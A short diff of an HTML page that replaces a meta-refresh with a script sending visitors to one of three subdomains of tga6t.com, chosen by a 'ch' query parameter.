@@ -2,6 +2,19 @@
 <head>
 </head>
 <body>
-<meta http-equiv="refresh" content="0;url=https://orch.tga6t.com" />
+<script>
+	var url = new URL(location.href);
+	var ch = url.searchParams.get('ch');
+	switch(ch){
+		case "a8":
+			window.location.href = "http://orch.tga6t.com";
+			break;
+		case "az":
+			window.location.href = "http://ivy1.tga6t.com";
+			break;
+		case "ml":default:
+			window.location.href = "http://lda0.tga6t.com";
+	}
+</script>
 </body>
 </html>
